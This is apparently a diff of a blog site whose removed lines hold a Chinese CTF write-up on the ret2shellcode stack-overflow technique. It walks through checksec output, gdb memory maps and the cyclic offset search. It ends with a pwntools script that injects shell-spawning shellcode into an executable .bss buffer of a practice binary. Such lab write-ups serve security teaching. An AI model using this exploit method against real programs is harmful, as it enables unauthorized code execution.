-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  checksec ret2shellcode</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-2-源码观察"><a href="#1-2-源码观察" class="headerlink" title="1.2 源码观察"></a>1.2 源码观察</h3><p>​	通过观察源程序可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="type">const</span> <span class="type">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​	这里的代码与ret2text差不多相同，不过这次还同时将对应的字符串复制到 buf2 处</p>
-<h3 id="1-3-逆向分析"><a href="#1-3-逆向分析" class="headerlink" title="1.3 逆向分析"></a>1.3 逆向分析</h3><p>​	简单查看可知 buf2 在 bss 段</p>
-<blockquote>
-<p>.bss:0804A080                 public buf2<br>.bss:0804A080 ; char buf2[100]</p>
-</blockquote>
-<p>​	gdb 调试程序</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">8	ret2shellcode.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────</span><br><span class="line"> EAX  0xf7fb9dbc (environ) —▸ 0xffffd59c —▸ 0xffffd70d ◂— 0x505f434c (&#x27;LC_P&#x27;)</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xaebb06ec</span><br><span class="line"> EDX  0xffffd524 ◂— 0x0</span><br><span class="line"> EDI  0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */</span><br><span class="line"> ESI  0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */</span><br><span class="line"> EBP  0xffffd4f8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd470 —▸ 0xffffd49e —▸ 0xffff0000 ◂— 0x0</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov    eax, dword ptr [0x804a060]</span><br><span class="line">────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">gef➤  vmmap </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line">0xf7e04000 0xf7e05000 rwxp     1000 0      </span><br><span class="line">0xf7e05000 0xf7fb5000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb5000 0xf7fb6000 ---p     1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb6000 0xf7fb8000 r-xp     2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb8000 0xf7fb9000 rwxp     1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb9000 0xf7fbc000 rwxp     3000 0      </span><br><span class="line">0xf7fd4000 0xf7fd5000 rwxp     1000 0      </span><br><span class="line">0xf7fd5000 0xf7fd7000 r--p     2000 0      [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 22000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 23000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br><span class="line">6-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure>
-
-<p>​	因为buf2所在的内存地址为0x0804A080 ,处于[0x0804a000, 0x0804b000)区间内，所以这个区间就是 BSS 段在内存中的位置</p>
-<blockquote>
-<p>0x804a000  0x804b000 rwxp     1000 1000   &#x2F;home&#x2F;richard&#x2F;Desktop&#x2F;demo1&#x2F;ret2shellcode</p>
-</blockquote>
-<p><strong>注意：如果观察到bss段不存在执行权限，可能是当前系统版本太高(在这里我使用的是ubuntu16.04)</strong></p>
-<p><img src="/images/image-20240320204423628.png" alt="image-20240320204423628"></p>
-<h2 id="2-确定偏移量"><a href="#2-确定偏移量" class="headerlink" title="2 确定偏移量"></a>2 确定偏移量</h2><h3 id="2-1-溢出报错确定偏移量"><a href="#2-1-溢出报错确定偏移量" class="headerlink" title="2.1 溢出报错确定偏移量"></a>2.1 溢出报错确定偏移量</h3><p>​	在 GDB 中，首先使用 pwndbg 的 cyclic 插件生成 200 个有序字符</p>
-<blockquote>
-<p>cyclic 200</p>
-</blockquote>
-<p><img src="/images/image-20240320205025701.png" alt="image-20240320205025701"></p>
-<p>​	然后运行程序至输入口，将生成的有序字符串作为 stdin 数据输入运行程序</p>
-<p><img src="/images/image-20240320205040321.png" alt="image-20240320205040321"></p>
-<p>​	继续运行程序，可以发现程序出错了，在0x62616164这个地址处出现错误，函数调用结束后会使用 ret 从栈中弹出一个数值作为 EIP 的数值，从而将下一条执行命令的地址修改为 EIP指向地址</p>
-<p><img src="/images/image-20240320205103128.png" alt="image-20240320205103128"></p>
-<p>​	然后使用 pwndbg 的 <code>cyclic -l</code>  查看在出错的字符前还有多少个字节的数据，可以看到在当前出错的数据前还有112个字符数据</p>
-<blockquote>
-<p>cyclic -l 0x62616164</p>
-</blockquote>
-<p><img src="/images/image-20240320173215041.png" alt="image-20240320173215041"></p>
-<h2 id="3-梳理逻辑，编写程序"><a href="#3-梳理逻辑，编写程序" class="headerlink" title="3 梳理逻辑，编写程序"></a>3 梳理逻辑，编写程序</h2><p>​	ret2shellcode，自己将shellcode写入可执行区域并执行</p>
-<p>​	所以我们需要输入这样一串字符：</p>
-<ul>
-<li><p>构建shell的汇编指令</p>
-</li>
-<li><p>112个字符数据(包括第一步构建的shell汇编指令和垃圾数据)</p>
-</li>
-<li><p>.bss:0x804a080内存地址</p>
-<p>最后的 payload 如下：</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2shellcode/" data-id="clu6gi7k20005kyvddbfh8aen" data-title="pwn-stackoverflow-ret2shellcode" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
 
     </footer>
   </div>
@@ -975,7 +1019,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/error/" style="font-size: 10px;">error</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 17.5px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/error/" style="font-size: 10px;">error</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 16.67px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 16.67px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
     </div>
   </div>
 
@@ -997,6 +1041,14 @@
       <ul>
         
           <li>
+            <a href="/2024/03/25/tools-CMD-hidden-cmdline/">tools-CMD-hidden-cmdline</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/25/tools-CMD-attrib/">tools-CMD-attrib</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/25/web-XSS-FlashXss-xss-PDF/">web-XSS-FlashXss-xss-PDF</a>
           </li>
         
@@ -1006,14 +1058,6 @@
         
           <li>
             <a href="/2024/03/22/web-XSS-FlashXss-xss-labs/">web-XSS-FlashXss-xss-labs</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/22/tools-Chrome-OldVersion/">tools-Chrome-OldVersion</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/21/program-PHP-Memory-Trojan/">program-PHP-Memory-Trojan</a>
           </li>
         
       </ul>
